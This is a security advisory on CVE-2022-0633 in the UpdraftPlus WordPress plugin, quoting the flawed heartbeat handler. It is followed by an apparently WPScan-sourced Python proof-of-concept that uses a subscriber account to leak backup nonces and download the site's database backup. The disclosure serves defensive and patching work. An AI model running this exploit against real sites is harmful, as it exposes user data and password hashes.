# Severe Vulnerability Fixed In UpdraftPlus 1.22.3

Updated on February 17, 2022 - Marc Montpas

During an internal audit of [the UpdraftPlus plugin](https://wordpress.org/plugins/updraftplus/), we uncovered an arbitrary backup download vulnerability that could allow low-privileged users like subscribers to download a site’s latest backups.

If exploited, the vulnerability could grant attackers access to privileged information from the affected site’s database (e.g., usernames and hashed passwords).

We reported the vulnerability to the plugin’s authors, and they recently released version 1.22.3 to address it. Forced auto-updates have also been pushed due to the severity of this issue. If your site hasn’t already, we strongly recommend that you update to the latest version (1.22.3) and have an established security solution on your site, such as [Jetpack Security](https://jetpack.com/features/security/).

You can find [UpdraftPlus’ own advisory here](https://updraftplus.com/updraftplus-security-release-1-22-3-2-22-3/).

## Details

Plugin Name: UpdraftPlus
Plugin URI: <https://wordpress.org/plugins/updraftplus/>
Author: <https://updraftplus.com/>

## The Vulnerability

### Arbitrary Backup Downloads

**Affected versions:** Every version between 1.16.7 and 1.22.3 (Free version), and
**CVE-ID:** [CVE-20](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0633)[2](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0633)[2-0633](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0633)
**WPVDB ID:** [d257c28f-3c7e-422b-a5c2-e618ed3c0bf3](https://wpscan.com/vulnerability/d257c28f-3c7e-422b-a5c2-e618ed3c0bf3)
**CVSSv3.1:** [8.5](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)
**CWSS:** [87.6](https://www.cwss-score.info/#TI:H,0.9/AP:NA,1/AL:NA,1/IC:NA,1.0/FC:T,1/RP:L,0.9/RL:NA,1/AV:NA,1/AS:NA,1/IN:A,1/SC:M,0.9/BI:H,0.9/DI:H,1/EX:H,1/EC:NA,1/P:NA,1/)

The plugin [uses custom “nonces”](https://plugins.trac.wordpress.org/browser/updraftplus/tags/1.22.1/class-updraftplus.php#L802) and timestamps to securely identify backups. Given the knowledge of said nonce and timestamp can give someone access to quite a few of the plugin’s features, making sure this info is only accessible to those who legitimately need it is crucial.

Unfortunately, as we’ll demonstrate, it wasn’t the case.

#### Nonce Leak

The first culprit was located on the UpdraftPlus\_Admin::process\_status\_in\_heartbeatmethod.

```

	/**
	 * Receive Heartbeat data and respond.
	 *
	 * Processes data received via a Heartbeat request, and returns additional data to pass back to the front end.
	 *
	 * @param array $response - Heartbeat response data to pass back to front end.
	 * @param array $data     - Data received from the front end (unslashed).
	 */
	public function process_status_in_heartbeat($response, $data) {
		if (!is_array($response) || empty($data['updraftplus'])) return $response;
		try {
			$response['updraftplus'] = $this->get_activejobs_list(UpdraftPlus_Manipulation_Functions::wp_unslash($data['updraftplus']));
		} catch (Exception $e) {
			$log_message = 'PHP Fatal Exception error ('.get_class($e).') has occurred during get active job list. Error Message: '.$e->getMessage().' (Code: '.$e->getCode().', line '.$e->getLine().' in '.$e->getFile().')';
			error_log($log_message);
			$response['updraftplus'] = array(
				'fatal_error' => true,
				'fatal_error_message' => $log_message
			);
		// @codingStandardsIgnoreLine
		} catch (Error $e) {
			$log_message = 'PHP Fatal error ('.get_class($e).') has occurred during get active job list. Error Message: '.$e->getMessage().' (Code: '.$e->getCode().', line '.$e->getLine().' in '.$e->getFile().')';
			error_log($log_message);
			$response['updraftplus'] = array(
				'fatal_error' => true,
				'fatal_error_message' => $log_message
			);
		}

		if (UpdraftPlus_Options::user_can_manage() && isset($data['updraftplus']['updraft_credentialtest_nonce'])) {
			if (!wp_verify_nonce($data['updraftplus']['updraft_credentialtest_nonce'], 'updraftplus-credentialtest-nonce')) {
				$response['updraftplus']['updraft_credentialtest_nonce'] = wp_create_nonce('updraftplus-credentialtest-nonce');
			}
		}

		$response['updraftplus']['time_now'] = get_date_from_gmt(gmdate('Y-m-d H:i:s'), 'D, F j, Y H:i');

		return $response;
	}

```

It did not properly ensure that the user sending this heartbeat request was an administrator (e.g. via functions like [current\_user\_can](https://developer.wordpress.org/reference/functions/current_user_can/)), which was a problem since the first thing this function tries to do is grab the list of active backup jobs via the **get\_activejobs\_list** method.

An attacker could thus craft a malicious request targeting this heartbeat callback to get access to information about the site’s latest backup to date, which will among other things contain a backup’s nonce.

## WordPress Plugin Vulnerabilities

# UpdraftPlus Free < 1.22.3 & Premium < 2.22.3 - Subscriber+ Backup Download

### Description

The plugins do not properly validate a user has the required privileges to access a backup's nonce identifier, which may allow any users with an account on the site (such as subscriber) to download the most recent site & database backup.

### Proof of Concept

from io import StringIO
import requests
import gzip
import json
import sys
import re
if len(sys.argv) != 4:
print('USAGE: python %s <target\_url> <user\_login> <user\_pass>' % (sys.argv[0],))
sys.exit()
url = sys.argv[1].rstrip('/')
with requests.Session() as s:
'''
This exploit requires an account on the site (subcriber+)
'''
print('Logging in...')
# Log into WordPress using our Subscriber account
res = s.post(
url + '/wp-login.php',
headers={ 'Cookie': 'wordpress\_test\_cookie=WP Cookie check' },
data={'log':sys.argv[2], 'pwd':sys.argv[3], 'wp-submit': 'Log In', 'redirect\_to': '/wp-admin/', 'testcookie':1})
'''
Exploit logic:
- The info leak occurs via the `heartbeat\_received` filter. So we need to get the `heartbeat` nonce to get there.
- With the info we leaked (backup "nonce" identifiers & timestamp), download the latest database backup.
'''
print('Getting heartbeat nonce..')
nonce = s.get(url + '/wp-admin/').text
nonce = re.search(r'heartbeatSettings = \{"nonce":"([0-9a-f]+)"\};', nonce).group(1)
if not nonce:
print("Couldn't find the heartbeat nonce :-(")
sys.exit()
# Get the UpdraftPlus "nonce" backup identifier, and timestamp
print('Get last UpdraftPlus backup nonce/timestamp..')
payload = {
'action': 'heartbeat',
'\_nonce': nonce,
'data[updraftplus][log\_fetch]': ':-)',
'data[updraftplus][log\_nonce]': '0',
}
heartbeat\_response = json.loads(s.post(url+'/wp-admin/admin-ajax.php', data=payload).text)
if 'updraftplus' not in heartbeat\_response or 'The backup apparently succeeded' not in heartbeat\_response['updraftplus']['l']:
print("Latest log doesn't show a successful backup :-(")
sys.exit()
data = heartbeat\_response['updraftplus']
backup\_info = re.search(r'Backup run: resumption=\d+, nonce=([a-f0-9]+), file\_nonce=([a-f0-9]+) begun at=(\d+)', data['u']['log']).groups()
if not backup\_info or len(backup\_info) != 3:
print("Backup logs aren't what we expected.. :-(")
sys.exit()
nonce, file\_nonce, timestamp = backup\_info
print(f'Found backup informations: file\_nonce={file\_nonce}, timestamp={timestamp}')
# Download the database backup
print('Attempt to download file backup..')
payload = {
'page': 'updraftplus',
'action': 'updraft\_download\_backup',
'findex': 'test',
'timestamp': timestamp,
'nonce': file\_nonce,
'type': 'db'
}
gzipped\_db = s.post(url+'/wp-admin/admin-post.php/%0a/wp-admin/options-general.php', data=payload).content
if len(gzipped\_db) < 100:
print("Not sure there was a db to download in the first place, but it failed downloading it!")
sys.exit()
print('Writing db dump to db.sql..')
f = open('db.sql', 'wb').write(gzip.decompress(gzipped\_db))
